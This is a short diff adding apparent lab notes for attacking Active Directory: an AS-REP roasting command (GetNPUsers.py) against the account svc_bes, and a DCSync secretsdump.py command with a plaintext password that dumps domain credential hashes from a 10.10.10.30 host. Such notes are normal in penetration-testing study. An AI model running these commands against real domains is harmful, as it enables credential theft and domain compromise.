@@ -1,0 +1,11 @@
+### kerberos ###
+  https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+  # Kerberoasting 
+  .\find-spn.p1
+  GetNPUsers.py megacorp.local/svc_bes -no-pass  -dc-ip 10.10.10.30
+
+### AD ###
+  # DCSync 
+  secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+
+  
